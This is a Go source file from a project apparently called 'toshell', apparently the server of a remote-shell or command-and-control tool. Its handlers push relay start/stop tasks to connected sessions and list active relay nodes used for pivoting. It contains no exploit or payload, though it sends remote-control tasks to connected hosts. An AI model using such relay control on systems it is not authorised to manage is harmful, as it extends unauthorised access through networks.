package api

import (
	"encoding/json"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/common/types"
	"toshell/internal/server/logging"
)

// relayControlHandler 运行时中继控制：对已上线会话下发 start/stop 中继监听。
// action: start（需 addr）/ stop。
func (s *Server) relayControlHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Action string `json:"action"`
		Addr   string `json:"addr"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if req.Action == "start" && req.Addr == "" {
		http.Error(w, `{"error":"addr is required for start"}`, http.StatusBadRequest)
		return
	}
	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.CreateRelayControl(id, req.Action, req.Addr)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "relay control (%s, addr=%s) pushed to session %s", req.Action, req.Addr, id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"action":    req.Action,
		"addr":      req.Addr,
		"message":   "relay control task pushed",
	})
}

// listRelayNodesHandler 列出当前正在监听的中继节点，供前端"选择中继会话"作为服务器地址。
func (s *Server) listRelayNodesHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	var nodes []types.RelayNode
	if s.listener != nil {
		nodes = s.listener.ListRelayNodes()
	}
	if nodes == nil {
		nodes = []types.RelayNode{}
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"relay_nodes": nodes,
		"count":       len(nodes),
	})
}
